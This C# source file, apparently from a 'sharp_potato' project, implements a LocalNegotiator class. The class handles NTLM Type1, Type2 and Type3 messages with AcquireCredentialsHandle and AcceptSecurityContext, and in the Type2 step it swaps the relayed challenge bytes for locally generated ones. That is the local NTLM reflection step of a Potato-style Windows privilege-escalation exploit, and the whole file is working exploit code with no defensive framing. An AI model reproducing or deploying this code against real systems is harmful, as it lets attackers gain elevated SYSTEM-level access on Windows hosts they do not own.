using System.Runtime.InteropServices;
using sharp_potato.Secur32;
using static sharp_potato.Secur32.Native;

namespace sharp_potato;

public class LocalNegotiator
{
    public int AuthResult { get; set; } = -1;
    public Vanara.PInvoke.Secur32.CtxtHandle Context => context;

    private SecBufferDesc secClientBufferDesc;
    private SecBufferDesc secServerBufferDesc;
    private SecBuffer secClientBuffer;
    private SecBuffer secServerBuffer;
    private Vanara.PInvoke.Secur32.CtxtHandle context;

    public IEnumerable<byte> HandleType1(byte[] data)
    {
        var result = AcquireCredentialsHandle(null, "Negotiate", SECPKG_CRED_INBOUND, IntPtr.Zero,
            IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out var credential, out _);

        if (result != SEC_E_OK)
        {
            Console.Out.WriteLine("Error in AcquireCredentialsHandle");
            return null;
        }

        secClientBuffer = new SecBuffer(data, SecBufferType.SECBUFFER_TOKEN);
        secClientBufferDesc = new SecBufferDesc(secClientBuffer);

        secServerBuffer = new SecBuffer {BufferType = (uint) SecBufferType.SECBUFFER_TOKEN};
        secServerBufferDesc = new SecBufferDesc(secServerBuffer);

        context = new Vanara.PInvoke.Secur32.CtxtHandle();

        result = AcceptSecurityContext(ref credential, IntPtr.Zero, ref secClientBufferDesc, ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
            SECURITY_NATIVE_DREP, ref context, ref secServerBufferDesc, out _, out _);

        secServerBuffer = new SecBuffer(secServerBufferDesc.GetBufferBytes(0), SecBufferType.SECBUFFER_TOKEN);
        secServerBufferDesc = new SecBufferDesc(secClientBuffer);

        return data;
    }

    public IEnumerable<byte> HandleType2(byte[] data)
    {
        var newNtlmBytes = new byte[secServerBuffer.cbBuffer];

        if (secServerBuffer.pvBuffer != IntPtr.Zero && secServerBuffer.cbBuffer != 0)
            Marshal.Copy(secServerBuffer.pvBuffer, newNtlmBytes, 0, (int) secServerBuffer.cbBuffer);

        if (data.Length >= secServerBuffer.cbBuffer)
        {
            for (int i = 0; i < data.Length; i++)
            {
                if (i < secServerBuffer.cbBuffer)
                    data[i] = newNtlmBytes[i];
                else
                    data[i] = 0x00;
            }
        }
        else
        {
            Console.WriteLine("Buffer sizes incompatible - can't replace");
        }

        return data;
    }

    public IEnumerable<byte> HandleType3(byte[] data)
    {
        secClientBuffer = new SecBuffer(data, SecBufferType.SECBUFFER_TOKEN);
        secClientBufferDesc = new SecBufferDesc(secClientBuffer);

        secServerBuffer = new SecBuffer {BufferType = (uint) SecBufferType.SECBUFFER_TOKEN};
        secServerBufferDesc = new SecBufferDesc(secServerBuffer);

        AuthResult = (int) AcceptSecurityContext(ref context, ref context, ref secClientBufferDesc, ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
            SECURITY_NATIVE_DREP, ref context, ref secServerBufferDesc, out _, out _);

        return data;
    }
}